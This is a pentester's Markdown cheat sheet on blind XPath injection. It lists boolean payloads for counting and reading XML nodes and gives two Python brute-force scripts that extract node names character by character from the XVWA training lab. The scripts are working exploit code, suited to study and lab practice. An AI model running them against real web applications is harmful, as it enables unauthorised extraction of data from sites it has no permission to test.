# XPath Injection
- You could think in a **SQLI** using `1' or '1'='1`. But it is not -> Probe **SQLI** or **NoSQLI**, is a **XPath Injection**?
- See [XPathI-HackTricks](https://book.hacktricks.xyz/pentesting-web/xpath-injection).
- Find **XML labels**.
	- Find the number of **principal** label (like heading 1) `1' and count(/*)='n`, where `n` is the *number* of desired labels.
	- Find the name of **principal**(s) label(s) `1' and name(/*)='NAME`, where `NAME` is the whole *name* of that desired label.
	- Find the name's size of **principal**(s) label(s) `1' and string-length(name(/*))>'n`, where `n` is the name's size to find, also probe `=`.
		`substring(string, start, length)`
		Probe each *character* in the *name* with `1' and substring(name(/*),1,1)='C`, where `C` is the *character*.
		```python
		#!/usr/bin/python3
		
		from pwn import *
		import signal
		import sys
		import requests
		import time
		import string
		import pdb
		
		# function to manage CTRL+c
		def def_handler(sig, frame):
		    print("\n[!] Exiting...\n")
		    sys.exit(1)
		
		# function to a brute force to find the name of a XML label
		def xpath_cracker():
		    p1 = log.progress("Brute force")
		    p1.status("Starting brute force process")
		
		    time.sleep(2)
		    
		    p2 = log.progress("Label name")
		
		    # acumulator
		    label_name = ""
		    # iterate label's name size
		    for index in range(1, 8):
		        for character in characters:
		            post_data = {"search": "1' and substring(name(/*),%d,1)='%c" % (index, character), "submit": ""}
		            r = requests.post(main_url, headers=headers, data=post_data)
		            # invalid characters
		            if len(r.text) != 8678:
		                label_name += character
		                p2.status(label_name)
		                break
		
		    p1.success("Brute force process finished")
		    p2.success(label_name)
		
		# CTRL+c
		signal.signal(signal.SIGINT, def_handler)
		
		# global variables
		main_url = "http://192.168.200.135/xvwa/vulnerabilities/xpath/"
		headers = {"Content-Type": "application/x-www-form-urlencoded"}
		characters = string.ascii_letters
		
		if __name__ == "__main__":
		    xpath_cracker()
		```
	- Find the number of **secundary** labels (like heading 2) `1' and count(/*[1]/*)='n`, where `/*[1]` refers to the *principal* label and `n` is the *number* of desired labels, also probe `>`.
	- Find the content of every ending *label* with `1' and substring(/*[1]/*[2]/Price,1,5)='$5.00`, where *Price* is already found.
	- Aux **Python** script with generalization.
		```python
		#!/usr/bin/python3
		
		from pwn import *
		import signal
		import sys
		import requests
		import time
		import string
		import pdb
		
		# function to manage CTRL+c
		def def_handler(sig, frame):
		    print("\n[!] Exiting...\n")
		    sys.exit(1)
		
		# function to a brute force to find the name of a XML label
		def xpath_name_cracker(label_index, label_name_size):
		    # acumulator
		    label_name = ""
		    # iterate label's name size
		    for index in range(1, label_name_size + 1):
		        for character in characters:
		            post_data = {"search": "1' and substring(name(/*[1]/*[%d]),%d,1)='%c" % (label_index, index, character), "submit": ""}
		            r = requests.post(main_url, headers=headers, data=post_data)
		            # invalid characters
		            if len(r.text) not in undesired_responses:
		                label_name += character
		                break
		    return label_name
		
		# function to a brute force to find the name of a XML label
		def xpath_name_size_cracker(label_index):
		    for i in range(1, 20):
		        post_data = {"search": "1' and string-length(name(/*[1]/*[%d]))='%d" % (label_index, i), "submit": ""}
		        r = requests.post(main_url, headers=headers, data=post_data)
		        # invalid characters
		        if len(r.text) not in undesired_responses:
		            return i
		
		# function to obtain all names of labels
		def xpath_cracker():
		    p1 = log.progress("Brute force")
		    p1.status("Starting brute force process")
		
		    time.sleep(2)
		    
		    p2 = log.progress("Label names")
		
		    # acumulator
		    label_names = []
		    # iterate label's name size
		    for i in range(1, 11):
		        label_size = xpath_name_size_cracker(i)
		        label_name = xpath_name_cracker(i, label_size)
		        label_names.append(label_name)
		        p2.status(label_names)
		
		    p1.success("Brute force process finished")
		    p2.success(label_names)
		
		# CTRL+c
		signal.signal(signal.SIGINT, def_handler)
		
		# global variables
		main_url = "http://192.168.200.135/xvwa/vulnerabilities/xpath/"
		headers = {"Content-Type": "application/x-www-form-urlencoded"}
		characters = string.ascii_letters
		undesired_responses = [i for i in range(8680, 8691)]
		
		if __name__ == "__main__":
		    xpath_cracker()
		```